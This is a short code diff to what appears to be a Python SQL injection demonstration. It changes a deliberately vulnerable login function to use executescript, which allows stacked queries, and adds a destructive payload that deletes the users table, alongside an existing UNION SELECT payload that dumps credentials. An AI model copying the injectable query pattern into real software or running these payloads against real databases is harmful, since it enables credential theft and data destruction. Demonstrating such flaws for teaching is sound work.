@@ -34,7 +34,7 @@ def vulnerable_login(username, password):
     query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
     print(f"Executing query: {query}")
     try:
-        cursor.execute(query)
+        cursor.executescript(query)
         result = cursor.fetchall()
         conn.close()
         return result
@@ -88,3 +88,7 @@ if __name__ == "__main__":
     injected_username = "' UNION SELECT id, username, password, email FROM users --"
     result = vulnerable_login(injected_username, "doesntmatterasalways")
     print(f"Success, here is the data: {result}")
+
+    injected_username = ""
+    password = "'; DELETE FROM users; --"
+    vulnerable_login(injected_username, password)
